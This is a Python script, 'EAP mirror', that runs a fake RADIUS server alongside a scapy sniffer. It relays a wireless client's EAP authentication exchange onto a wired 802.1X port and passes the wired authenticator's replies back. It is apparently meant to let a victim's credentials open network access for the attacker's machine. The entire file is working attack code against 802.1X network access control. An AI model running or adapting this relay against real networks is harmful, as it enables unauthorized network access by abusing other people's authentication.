#!/usr/bin/python
from pyrad import dictionary, packet as pyrad_packet, server
import logging
import sys

# suppress warning during scapy import
import warnings
from cryptography.utils import CryptographyDeprecationWarning
warnings.filterwarnings("ignore", category=CryptographyDeprecationWarning)

from scapy.all import *

import threading
import argparse

parser = argparse.ArgumentParser(description='EAP mirror')
parser.add_argument('interface', type=str, help='wired interface name')
parser.add_argument('mac_address', type=str, help='wired interface mac address')
args = parser.parse_args()

iface = args.interface
my_mac = args.mac_address

EAP_MAC = '01:80:c2:00:00:03' # Nearest-non-TPMR-bridge 

# TODO make logging to stdout colorful

radius_logger = logging.getLogger('radius')
wire_logger = logging.getLogger('wire')

formatter = logging.Formatter("%(asctime)s [%(levelname)s] %(message)s")

stdout_handler = logging.StreamHandler(stream=sys.stdout)
stdout_handler.setFormatter(formatter)

radius_handler = logging.FileHandler(filename="radius.log")
radius_handler.setFormatter(formatter)

radius_logger.addHandler(stdout_handler)
radius_logger.addHandler(radius_handler)
radius_logger.setLevel('DEBUG')

wire_handler = logging.FileHandler(filename="wire.log")
wire_handler.setFormatter(formatter)

wire_logger.addHandler(stdout_handler)
wire_logger.addHandler(wire_handler)
wire_logger.setLevel('DEBUG')

client = None

"""
State machine for client:

0: need to send EAP-start -> 1
1: sended EAP-start -> 2
2: means two things: (transparent proxying)
    first: 
        recieved response after EAP-start, (typically identity request),
        this state is needed to replay client's first packet: identity response
    second:
        replay client's packet

    in both cases answer from this state will be transmitted to AP -> 3

3: waiting for data from wire -> 4 (when received packet)
4: not ready to receive any more packets on wire -> 2 (when ready, on packet from client)
"""

class ClientState():
    def __init__(self, client_mac):
        self.lock = threading.Lock()
        self.state = 0 
        self.eap_ap_id = None
        self.eap_wire_id = None
        self.mac = client_mac
        self.data_to_send = b''

    def sendp(self, pkt):
        wire_logger.info(f"Sending data to wire, state {self.state}, len {len(pkt[Ether])}")
        sendp(pkt, iface=iface)

    def eapol_start_wire(self):
        self.lock.acquire() 

        if self.state != 0:
            wire_logger.error("Not in the initial state, yet trying to initiate EAP!")
            wire_logger.error("Client MAC: " + self.mac + ", state: " + self.state)
            return

        self.state = 1
        wire_logger.info("Sending EAP-start")

        new_pkt = Ether(src=my_mac, dst=EAP_MAC , type=0x888e)
        new_pkt = new_pkt/EAPOL(version='802.1X-2001', type=1)
        self.sendp(new_pkt)

    def send_eap_to_wire(self, eap_bytes: bytes):
        new_pkt = Ether(src=my_mac, dst=EAP_MAC, type=0x888e)
        new_pkt = new_pkt/EAPOL(version='802.1X-2004')/EAP(eap_bytes)
        new_pkt[EAP].id = self.eap_wire_id

        self.sendp(new_pkt)

    def handle_packet_from_ap(self, eap_bytes: bytes) -> bytes:
        pkt = EAP(eap_bytes)
        if self.eap_ap_id is not None and self.eap_ap_id == pkt.id:
            # received a duplicate request
            # https://www.rfc-editor.org/rfc/rfc2865.html#page-14
            return None

        if self.state == 0: # need to perform introduction on wire
            wire_logger.info("Attempting to send Start-EAP")
            self.eapol_start_wire()

        self.lock.acquire() # blocks if we initiated Start-EAP and prevents race conditions

        if self.state == 4:
            self.state = 2  # stop discarding packets, as we intend to relay something

        if self.state == 2: # relay after skipping a packet
            self.state = 3
            self.send_eap_to_wire(eap_bytes)
            self.lock.acquire() 

            self.eap_ap_id = pkt.id
            pkt_res = EAP(self.data_to_send)
            pkt_res.id = (self.eap_ap_id + 1) % 0x100 # TODO: verify overflow handling

            self.lock.release()

            return bytes(pkt_res)

        wire_logger.error(f"Arrived to unexpected state: {self.state}! Replaying previous data")
        return self.data_to_send

    def handle_packet_from_wire(self, pkt: Ether) -> None:
        if self.state == 1: # Waiting for response on Start-EAP
            if not (pkt[EAP].code == 1 and pkt[EAP].type == 1):
                wire_logger.warning(f"Response to Start-EAP has unexpected type: {pkt[EAP].type}") 
            self.state = 2
            wire_logger.info(f"EAP server found, {pkt[Ether].src}")
            self.eap_wire_id = pkt[EAP].id
            self.lock.release()
            return
        elif self.state == 3: # await response from relaying
            self.state = 4 # do not expect any packets 
            self.eap_wire_id = pkt[EAP].id
            self.data_to_send = bytes(pkt[EAP])
            self.lock.release()
            return
        elif self.state == 4: # discard everything
            return

def split_to_chunks(array, size):
    return [array[i:i+size] for i in range(0,len(array),size)]

class FakeServer(server.Server):
    def HandleAuthPacket(self, pkt):
        global client

        client_mac = pkt.get('Calling-Station-Id')[0].replace('-', ':')

        radius_logger.info(f"Received Radius Authentication packet for {client_mac} client")

        if client is None:
            radius_logger.info(f"Adding a new client: {client_mac}")
            client = ClientState(client_mac)
            first_client = client_mac
        elif client.mac != client_mac:
            radius_logger.error("Can't support more than 1 client! Consider restarting")
            return # ignoring, might receive a lot of duplicate requests from hostapd

        eap_incoming = b''.join(map(lambda x: x if isinstance(x, bytes) else x.encode(), pkt.get('EAP-Message')))

        eap_outgoing = client.handle_packet_from_ap(eap_incoming)
        if eap_outgoing is None: # duplicate request detected
            radius_logger.info("Discarded duplicate request")
            return

        eap_outgoing = split_to_chunks(eap_outgoing, 253)

        attrs = {
            "EAP-Message": eap_outgoing
        }
        if not pkt.get('State') is None:
            attrs['State'] = pkt.get('State')
        reply = self.CreateReplyPacket(pkt, **attrs)
        reply.add_message_authenticator()
        reply.code = pyrad_packet.AccessChallenge

        radius_logger.info(f"Responding with Radius AccessChallenge packet for {client_mac} client")

        self.SendReplyPacket(pkt.fd, reply)

    def HandleAcctPacket(self, pkt):
        radius_logger.warning("Received an accounting request, this request will be ignored:")
        for attr in pkt.keys():
            radius_logger.warning("\t%s: %s" % (attr, pkt[attr]))

    def HandleDisconnectPacket(self, pkt):
        radius_logger.warning("Received an disconnect request:")
        for attr in pkt.keys():
            radius_logger.warning("\t%s: %s" % (attr, pkt[attr]))

        reply = self.CreateReplyPacket(pkt)
        # COA NAK
        reply.code = 45
        self.SendReplyPacket(pkt.fd, reply)

    def Run(self):
        radius_logger.info("Starting radius")
        super().Run()
        

class Sniffer():
    def handle_pkt(self, pkt):
        global client
        # Ignoring packets not meant for us:
        if not pkt.haslayer(Ether) or pkt[Ether].src == my_mac  or client is None:
            return
        elif pkt[Ether].dst != my_mac and pkt[Ether].dst != EAP_MAC: # Mikrotik responds to Nearest-non-TPMR-bridge instead of our mac
            return

        if not pkt.haslayer(EAPOL):
            wire_logger.debug(f"Recieved non-EAPOL packet from {pkt[Ether].src} discarding")
            return
        elif not pkt.haslayer(EAP):
            wire_logger.warning("Got EAPOL, but not EAP, discarding")
            return

        client.handle_packet_from_wire(pkt)

    
    def Run(self):
        wire_logger.info("Starting sniffer")
        sniff(iface=iface, prn=self.handle_pkt)


if __name__ == '__main__':
    radius = FakeServer(dict=dictionary.Dictionary("dicts/dictionary"))

    radius.hosts["127.0.0.1"] = server.RemoteHost("127.0.0.1", b"testing123", "localhost")
    radius.BindToAddress("127.0.0.1")

    sniffer = Sniffer()

    radius_thread = threading.Thread(target=radius.Run)
    sniffer_thread = threading.Thread(target=sniffer.Run)

    radius_thread.start()
    sniffer_thread.start()

    radius_thread.join()
    sniffer_thread.join()


